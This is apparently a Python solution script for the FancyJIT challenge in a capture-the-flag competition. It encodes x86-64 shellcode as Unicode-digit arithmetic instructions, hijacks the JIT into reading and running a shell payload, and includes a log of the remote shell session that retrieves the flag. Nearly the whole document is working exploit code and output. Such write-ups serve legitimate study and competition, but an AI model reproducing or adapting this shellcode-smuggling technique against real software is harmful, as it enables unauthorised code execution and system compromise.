#!/usr/bin/env python
# -*- coding: utf-8 -*-
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from struct import pack as p, unpack as u
import itertools

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':'java -Xmx200m -cp jna-5.2.0.jar:. FancyJIT.java'.split(' ')}, \
                        remote  = {'host':'jit.ctfcompetition.com', 'port':1337})
env.select()

#==========

zeros = ('0', '０', '٠')

#==========

def attack(conn, **kwargs):
    payload = [
            find_jmp(1, 0),
            find_dword(asm('xor rax, rax')),
            find_dword(asm('xor rdi, rdi')),
            find_dword(asm('xor rsi, rsi')),
            find_dword(asm('inc rsi')),
            find_dword(asm('shl rsi, 0x23'))
            ]
    payload += [
            find_jmp(1, len(payload)),
            find_dword(asm('syscall')),
            find_dword(asm('jmp rsi')),
            ]

    conn.sendlineafter('result:\n', '\n'.join(payload)+'\n\n')

    shellasm = shellcraft.sh()
    if env.check('remote'):
        info('waiting...')
        sleep(7)
    conn.send(asm(shellasm))

def find_dword(vul):
    target = u32((vul.ljust(3, '\x90') + '\xb3')[:4])

    for l in itertools.product(zeros, repeat=0x10):
        n = 0
        for c in ''.join(l):
            n = (n * 10 + u('I', p('i', u('b', c)[0]))[0]-0x30) & 0xffffffff
        n = (n * 100000) & 0xffffffff
        if target > n and target - n < 100000:
            success('DWORD ({:x}) FOUND!!'.format(target))
            return 'MOV(A, {})'.format(''.join(l)+'%05d' % (target - n))

    error('DWORD ({:x}) not found'.format(target))

def find_jmp(ofs, pos):
    for l in itertools.product(zeros, repeat=3):
        n = 0
        for c in ''.join(l):
            n = (n * 10 + u('I', p('i', u('b', c)[0]))[0]-0x30) & 0xffffffff
        for i in range(10):
            op = ((n * 10 + i - pos) * 5 - 5) % 0x100
            OP = u('b', chr(op))[0]
            if OP == 1:
                success('JMP (ofs={}, pos={}) FOUND!!'.format(ofs, pos))
                return 'JMP({})'.format(''.join(l)+str(i))

    error('JMP (ofs={}, pos={}) not found'.format(ofs, pos))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

    '''
Select Environment
['remote', 'local'] ...r
[*] Environment : set environment "remote"
[+] Opening connection to jit.ctfcompetition.com on port 1337: Done
[+] JMP (ofs=1, pos=0) FOUND!!
[+] DWORD (b3c03148) FOUND!!
[+] DWORD (b3ff3148) FOUND!!
[+] DWORD (b3f63148) FOUND!!
[+] DWORD (b3c6ff48) FOUND!!
[+] DWORD (23e6c148) FOUND!!
[+] JMP (ofs=1, pos=6) FOUND!!
[+] DWORD (b390050f) FOUND!!
[+] DWORD (b390e6ff) FOUND!!
[*] Switching to interactive mode
$ ls -al
$ ls -al
total 1532
drwxr-xr-x 2 user   user       4096 Jun 14 07:15 .
drwxr-xr-x 3 nobody nogroup    4096 Jun 14 07:08 ..
-rw-r--r-- 1 user   user        220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 user   user       3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 user   user        807 Apr  4  2018 .profile
-rw-r--r-- 1 nobody nogroup     521 Jun 14 07:08 FancyJIT$CompilierLib.class
-rw-r--r-- 1 nobody nogroup     427 Jun 14 07:08 FancyJIT$Instr.class
-rw-r--r-- 1 nobody nogroup    2966 Jun 14 07:08 FancyJIT$Parser.class
-rw-r--r-- 1 nobody nogroup    2945 Jun 14 07:08 FancyJIT.class
-rw-r----- 1 user   user       4962 Jun 10 20:35 FancyJIT.java
-rw-r----- 1 user   user        439 Jun  4 13:02 Makefile
-rw-r----- 1 user   user       4408 Jun 10 20:35 compiler.c
-rw-r----- 1 user   user         40 Jun  4 13:02 flag
-rw-r--r-- 1 nobody nogroup 1488769 Dec 23  2018 jna-5.2.0.jar
-rwxr-xr-x 1 nobody nogroup   12568 Jun 14 07:08 libcompiler.so
$ cat flag
CTF{8röther_m4y_1_h4v3_söm3_nümb3r5}
    '''

#==========
